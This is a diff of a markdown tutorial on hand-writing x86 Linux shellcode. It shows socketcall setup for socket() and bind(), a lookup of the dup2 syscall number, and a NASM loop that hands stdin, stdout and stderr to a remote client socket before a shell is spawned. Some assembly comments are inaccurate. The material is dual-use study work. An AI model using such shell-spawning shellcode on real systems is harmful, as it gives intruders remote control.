@@ -26,7 +26,7 @@ int socket(int domain, int type, int protocol);
 ```
 #### Our C Function
 ```c
-            socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
+<socketcall> socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
 EAX=0x66     EBX    ECX[0]     ECX[1]      ECX[2]
 ```  
 + `EAX = 0x66 = 102`
@@ -76,7 +76,6 @@ struct sockaddr_in {
 { .sin_family = AF_INET, .sin_port = htons(1337), .sin_addr.s_addr = 127.1.1.1 }
            ARG[0]               ARG[1]                       ARG[2]
 ```
-+ 
 + `ARG[0] = 0x2`
   - Value for `AF_INET`
 + `ARG[1] = 0x3905`
@@ -89,13 +88,17 @@ struct sockaddr_in {
 ```c
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ```
+#### Our C Function
+```c
+<socketcall> bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));  
+EAX=0x66     EBX    ECX[0]                   ECX[1]                  ECX[2]
+```
 
-
-+ `ECX[0] = 0x10`
-  -  Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
-+ `ECX[1] = pointer to the struct on our stack`
-+ `ECX[2] = push esi`
++ `ECX[0] = push esi`
   - This is the value we saved from creating the Socket earlier. 
++ `ECX[1] = pointer to the struct on our stack`
++ `ECX[2] = 0x10`
+  -  Our Struct of ARG's is now 16 bytes long (`0x10` in Hex). 
 
 #### Assembly Code for the address struct & function bind().
 ```nasm 
@@ -125,17 +128,23 @@ dup2( clientSocket, 1 ); // STDOUT
 dup2( clientSocket, 2 ); // STDERR
 EAX       EBX      ECX     
 ```
+#### Finding Value for dup2 systemcall.
+```console
+cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
+  #define __NR_dup2  63
+```   
+
 
 #### Assembly Loop to transfer input and output to the remote socket.
 ```nasm 
- xchg ebx, esi     ; This is our socket value returned from our `socket` systemcall.
- xor ecx, ecx      ; Clear the ECX Register
+xchg ebx, esi     ; This is our socket value returned from our `socket` systemcall.
+xor ecx, ecx      ; Clear the ECX Register
 dup2loop:
- mov al, 0x3f      ; EAX Syscall dup2() for STDIN STDOUT STDERR
- int 0x80          ; execute dup2()
- inc ecx           ; increase EAX by 1
- cmp cl, 0x4       ; compare cl to 4, if it is 4 the flag will be set
- jne dup2loop      ; Jumps to the specified location if flag is set
+mov al, 0x3f      ; EAX Syscall dup2() for STDIN STDOUT STDERR
+int 0x80          ; execute dup2()
+inc ecx           ; increase EAX by 1
+cmp cl, 0x4       ; compare cl to 4, if it is 4 the flag will be set
+jne dup2loop      ; Jumps to the specified location if flag is set
 ```
 
 ### 5. Spawn a bash shell for the remote client
